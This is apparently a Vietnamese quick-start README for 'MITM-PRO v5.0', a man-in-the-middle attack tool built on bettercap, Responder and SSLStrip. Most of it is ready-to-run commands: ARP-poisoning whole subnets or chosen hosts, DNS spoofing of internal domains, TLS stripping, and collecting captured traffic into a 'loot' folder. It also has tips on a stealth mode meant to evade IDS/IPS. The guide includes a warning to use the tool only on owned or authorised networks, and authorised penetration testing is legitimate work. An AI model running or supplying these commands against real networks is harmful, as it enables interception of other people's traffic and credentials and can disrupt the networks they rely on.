# 🚀 MITM-PRO v5.0 — Quick Start Guide

## TL;DR - Chạy ngay (cho người vội)

```bash
# 1. Cài đặt (chỉ cần 1 lần)
cd mitm-pro-v5
sudo ./install_dependencies.sh

# 2. Chạy (interactive wizard)
sudo python3 mitm_pro.py

# 3. Hoặc chạy CLI nhanh
sudo python3 mitm_pro.py -i eth0 -g 192.168.1.1 -R 192.168.1.0/24 --mode normal
```

---

## 📋 Lệnh thường dùng

### Chế độ Wizard (dễ nhất)
```bash
sudo python3 mitm_pro.py
```
Tool sẽ hỏi từng bước: interface, gateway, targets, mode

### Quét và tấn công toàn bộ mạng
```bash
sudo python3 mitm_pro.py -i eth0 -g 192.168.1.1 -R 192.168.1.0/24
```

### Tấn công targets cụ thể
```bash
sudo python3 mitm_pro.py -i eth0 -g 192.168.1.1 -T 192.168.1.100,192.168.1.101
```

### Với DNS Spoofing
```bash
sudo python3 mitm_pro.py \
  -i eth0 -g 192.168.1.1 -R 192.168.1.0/24 \
  --dns-spoof --dns-domains "*.corp.local" --dns-address 192.168.1.50
```

### Chế độ aggressive (nhanh)
```bash
sudo python3 mitm_pro.py -i eth0 -g 192.168.1.1 -R 192.168.1.0/24 --mode aggressive
```

### Dry-run (test không tấn công)
```bash
sudo python3 mitm_pro.py -i eth0 -g 192.168.1.1 -R 192.168.1.0/24 --dry-run
```

---

## 🔍 Kiểm tra trước khi chạy

```bash
# 1. Xem các interface
ip addr show

# 2. Tìm gateway
ip route | grep default

# 3. Quét mạng thủ công
sudo nmap -sn 192.168.1.0/24

# 4. Kiểm tra tools đã cài chưa
bettercap --version
nmap --version
tcpdump --version
responder --version
```

---

## 🛑 Troubleshooting nhanh

### "Bettercap không khởi động được"
```bash
# Kiểm tra interface đúng chưa
ip addr show

# Kiểm tra port 8083 bị chiếm chưa
sudo netstat -tlnp | grep 8083

# Xem log bettercap
cat mitm_pro_loot/bettercap_stdout.log
```

### "Không tìm thấy bettercap"
```bash
which bettercap
# Nếu không có → chạy lại install script
sudo ./install_dependencies.sh
```

### "Permission denied"
```bash
# Nhớ dùng sudo
sudo python3 mitm_pro.py
```

---

## 📊 Xem kết quả

```bash
# Xem log real-time
tail -f mitm_pro_loot/mitm_pro.log

# Xem bettercap log
tail -f mitm_pro_loot/bettercap_stdout.log

# Xem PCAP với Wireshark
wireshark mitm_pro_loot/capture.pcap

# Xem report HTML
firefox mitm_pro_loot/PENTEST_REPORT_*.html
```

---

## ⚙️ Options đầy đủ

```
-i, --interface       Interface (eth0, wlan0, v.v.)
-g, --gateway         Gateway IP
-R, --range           CIDR để quét (192.168.1.0/24)
-T, --targets         IPs cụ thể (10.0.0.5,10.0.0.6)
-o, --outdir          Thư mục output (mặc định: mitm_pro_loot)
--mode                safe/normal/aggressive
--max-targets         Giới hạn targets (mặc định: 25)
--no-report           Không tạo HTML report
--no-responder        Không chạy Responder
--no-sslstrip         Không dùng SSLStrip
--dns-spoof           Bật DNS spoofing
--dns-domains         Domain spoof (*.example.com)
--dns-address         IP trả về cho DNS
--api-port            Bettercap API port (8083)
--config              File YAML config
--dry-run             Test không tấn công
```

---

## 🎯 Workflow điển hình

```bash
# Bước 1: Recon
ip addr show                      # Tìm interface
ip route | grep default           # Tìm gateway
sudo nmap -sn 192.168.1.0/24     # Quét mạng

# Bước 2: Chạy attack
sudo python3 mitm_pro.py \
  -i eth0 \
  -g 192.168.1.1 \
  -R 192.168.1.0/24 \
  --mode normal

# Bước 3: Để chạy 5-10 phút
# Dashboard sẽ hiển thị live traffic

# Bước 4: Ctrl+C để dừng

# Bước 5: Xem kết quả
ls -lh mitm_pro_loot/
firefox mitm_pro_loot/PENTEST_REPORT_*.html
wireshark mitm_pro_loot/capture.pcap
```

---

## 💡 Tips

- **Safe mode** - Chậm nhưng khó bị phát hiện (khuyên dùng trong pentest thật)
- **Normal mode** - Cân bằng tốc độ/stealth
- **Aggressive mode** - Nhanh nhưng dễ bị IDS/IPS phát hiện

- Luôn xem log để debug: `tail -f mitm_pro_loot/mitm_pro.log`
- Dashboard chạy real-time, nhấn Ctrl+C để dừng an toàn
- Report HTML tự sinh sau khi dừng

---

## ⚠️ Lưu ý quan trọng

1. **CHỈ dùng trên mạng bạn sở hữu hoặc có ủy quyền**
2. ARP poisoning có thể làm gián đoạn mạng nếu không cẩn thận
3. Luôn test trong lab trước khi dùng trên mạng thật
4. Backup cấu hình mạng trước khi test

---

**📖 Xem chi tiết: [KALI_SETUP.md](KALI_SETUP.md)**
